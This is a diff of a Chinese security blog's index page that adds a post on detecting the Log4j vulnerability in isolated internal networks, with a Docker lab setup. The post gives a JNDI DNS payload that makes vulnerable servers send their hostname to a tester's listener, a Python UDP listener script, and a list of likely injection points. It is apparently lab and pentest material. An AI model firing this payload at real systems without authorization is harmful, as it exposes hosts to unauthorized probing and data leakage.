@@ -247,6 +247,123 @@ class="article article-type-post"
   
     
       <article
+id="post-Log4j漏洞复现"
+class="article article-type-post"
+>
+
+
+
+<div class="article-inner">
+    
+
+    <div class="article-body">
+    <header class="article-title">
+        <a href="/7209cfed.html">Log4j漏洞内网检测</a>
+    </header>
+    <div class="article-entry post-inner-html">
+        
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近 Log4j 的漏洞算是刷疯了，各种姿势利用，由于最近在搞内网测试，此次主要考虑不出网的黑盒测试。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>网上已有相关复现教程，环境下载地址：<a target="_blank" rel="noopener" href="https://github.com/fengxuangit/log4j_vuln">https://github.com/fengxuangit/log4j_vuln</a></p>
+<p>推荐docker一键搭建：</p>
+<pre><code class="hljs shell">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln
+docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln 
+docker exec -it log4j_vuln_container /bin/bash
+/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</code></pre>
+
+<p>之后访问：<a target="_blank" rel="noopener" href="http://ip:8080/webstudy/hello-fengxuan">http://IP:8080/webstudy/hello-fengxuan</a> POST 发包测试。</p>
+<p>截图如下：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211214190342029.png" alt="image-20211214190342029"></p>
+<p>由于内网不出网时无法使用DNSlog，可以指定dns进行测试。</p>
+<p>payload：<code>$&#123;jndi:dns://172.21.1.14:6666/$&#123;hostName&#125;&#125;</code></p>
+<p>其中172.21.1.14为本机 IP，6666为监听的UDP端口。</p>
+<p>写了一个小脚本，启动一个UDP监听端口，进行辅助测试。</p>
+<pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">import</span> binascii
+<span class="hljs-keyword">import</span> codecs
+<span class="hljs-keyword">import</span> signal
+<span class="hljs-keyword">import</span> socket
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> time
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bytesToHexString</span>(<span class="hljs-params">bs</span>):</span>
+    hex_str = <span class="hljs-string">&#x27;&#x27;</span>.join ([<span class="hljs-string">&#x27;%02X&#x27;</span> % b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> bs])
+    strs = (binascii.unhexlify (hex_str)).decode (errors=<span class="hljs-string">&quot;replace&quot;</span>)
+    <span class="hljs-keyword">return</span> strs
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">quit</span>(<span class="hljs-params">signum, frame</span>):</span>
+    sys.exit()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">udp_listen</span>(<span class="hljs-params">add</span>):</span>
+    signal.signal (signal.SIGINT, quit)
+    signal.signal (signal.SIGTERM, quit)
+    address = add
+    s = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
+    s.bind (address)
+    data = <span class="hljs-string">&quot;&quot;</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
+        data2 = data
+        data, addr = s.recvfrom (<span class="hljs-number">4096</span> * <span class="hljs-number">12</span>)
+        <span class="hljs-keyword">if</span> data == data2:
+            <span class="hljs-keyword">pass</span>
+        <span class="hljs-keyword">else</span>:
+            data2 = data
+            ts = time.strftime (<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, time.localtime ())
+            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;DateTime: &quot;</span>, ts)
+            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;From IP : &quot;</span>, <span class="hljs-built_in">list</span> (addr)[<span class="hljs-number">0</span>] + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span> (<span class="hljs-built_in">list</span> (addr)[<span class="hljs-number">1</span>]))
+            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;GetData : &quot;</span>, bytesToHexString (data))
+            <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;-----------------------------------------------------------&quot;</span>)
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    <span class="hljs-comment"># 设置IP，端口进行UDP监听</span>
+    ip = <span class="hljs-string">&quot;172.21.1.14&quot;</span>
+    port = <span class="hljs-number">6666</span>
+    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;Listen IP : &quot;</span>, ip + <span class="hljs-string">&quot;:&quot;</span> + <span class="hljs-built_in">str</span> (port))
+    add = (ip, port)
+    udp_listen (add)</code></pre>
+
+<p>效果如下：</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20211214191142020.png" alt="image-20211214191142020"></p>
+<h1 id="测试经验"><a href="#测试经验" class="headerlink" title="测试经验"></a>测试经验</h1><p>​    最近几天也是在疯狂测试，梳理了几个可能存在该漏洞的点，仅供各位师傅参考。</p>
+<ol>
+<li>客服聊天框。</li>
+<li>搜索框。</li>
+<li>数据包含有如下字段content，key，query，name等。</li>
+<li>查询或搜索的URI，例如querylist.do，searchinfo.do等。</li>
+</ol>
+
+        
+    </div>
+    </div>
+
+    <div class="article-badge">
+        
+        
+    </div>
+
+</div>
+
+<footer class="article-footer">
+    <div class="article-more-info">
+    <div class="article-date">
+  <time datetime="2021-12-14T10:48:31.000Z" itemprop="datePublished">2021-12-14</time>
+</div>
+    
+        <div class="article-category">
+        <a class="article-category-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>,<a class="article-category-link" href="/categories/%E8%84%9A%E6%9C%AC%E5%BC%80%E5%8F%91/">脚本开发</a>
+        </div>
+    
+    
+        <div class="article-tag">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Log4j/" rel="tag">Log4j</a></li></ul>
+        </div>
+    
+    </div>
+</footer>
+
+</article>
+
+    
+  
+    
+      <article
 id="post-E1-Empire安装使用"
 class="article article-type-post"
 >
@@ -604,57 +721,6 @@ class="article article-type-post"
 
     
   
-    
-      <article
-id="post-资产侦察灯塔系统（ARL）配置使用"
-class="article article-type-post"
->
-
-
-
-<div class="article-inner">
-    
-
-    <div class="article-body">
-    <header class="article-title">
-        <a href="/15947586.html">资产侦察灯塔系统（ARL）</a>
-    </header>
-    <div class="article-entry post-inner-html">
-        
-        <h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>ARL(Asset Reconnaissance Lighthouse)旨在快速侦察与目标关联的互联网资产，构建基础资产信息库。 协助甲方安全团队或者渗透测试人员有效侦察和检索资产，发现存在的薄弱点和攻击面。
-        
-    </div>
-    </div>
-
-    <div class="article-badge">
-        
-        
-    </div>
-
-</div>
-
-<footer class="article-footer">
-    <div class="article-more-info">
-    <div class="article-date">
-  <time datetime="2021-06-11T03:23:14.000Z" itemprop="datePublished">2021-06-11</time>
-</div>
-    
-        <div class="article-category">
-        <a class="article-category-link" href="/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/">环境配置</a>
-        </div>
-    
-    
-        <div class="article-tag">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li></ul>
-        </div>
-    
-    </div>
-</footer>
-
-</article>
-
-    
-  
 
   
     <nav class="pagination">
@@ -699,7 +765,7 @@ class="article article-type-post"
   <div class="widget-wrap widget-tags">
     <div class="widget-title"><span>Tags</span></div>
     <div class="widget-inner">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ARL/" rel="tag">ARL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Access/" rel="tag">Access</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Bugku/" rel="tag">Bugku</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Cap-Pwd/" rel="tag">Cap_Pwd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CobaltStrike/" rel="tag">CobaltStrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Empire/" rel="tag">Empire</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/GetShell/" rel="tag">GetShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Goby/" rel="tag">Goby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Intranet/" rel="tag">Intranet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/" rel="tag">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Lfi/" rel="tag">Lfi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Log4j/" rel="tag">Log4j</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Mysql/" rel="tag">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Oracle/" rel="tag">Oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Proxy/" rel="tag">Proxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pth/" rel="tag">Pth</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Sql/" rel="tag">Sql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/VulLab/" rel="tag">VulLab</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xff/" rel="tag">Xff</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Xray/" rel="tag">Xray</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li></ul>
     </div>
   </div>
 
@@ -710,6 +776,10 @@ class="article article-type-post"
     <div class="widget-title"><span>Recent Posts</span></div>
     <div class="widget-inner">
       <ul>
+        
+          <li>
+            <a href="/7209cfed.html">Log4j漏洞内网检测</a>
+          </li>
         
           <li>
             <a href="/f0bfc07b.html">Empire-配置安装和基本使用</a>
@@ -725,10 +795,6 @@ class="article article-type-post"
         
           <li>
             <a href="/1bfef19e.html">反制Goby扫描之XSS点击上线</a>
-          </li>
-        
-          <li>
-            <a href="/a7a10e0e.html">docx批量转markdown脚本分享</a>
           </li>
         
       </ul>
